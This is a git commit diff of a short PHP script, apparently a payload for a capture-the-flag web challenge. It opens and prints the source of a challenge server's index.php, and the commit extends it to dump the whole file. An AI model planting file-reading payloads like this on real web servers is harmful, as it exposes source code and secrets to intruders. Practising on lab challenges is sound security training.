1cc524af7bdae4147169ed63822fed4dbd913009
yelsanya <56681837+yelsanya@users.noreply.github.com>
2020-10-08 01:39:20 +0900

    Update command.php

--- command.php
+++ command.php
@@ -1,6 +1,8 @@
 <?php
-echo("Entered Evil Zone"."</br>");
+echo("Entered Evil Zone"."<br>");
 $myfile = fopen("/challenge/web-serveur/ch13/index.php", "r") or die("Unable to open file!");
-echo(fgets($myfile));
+while(!feof($myfile)) {
+  echo fgets($myfile) . "<br>";
+}
 fclose($myfile);
 ?>
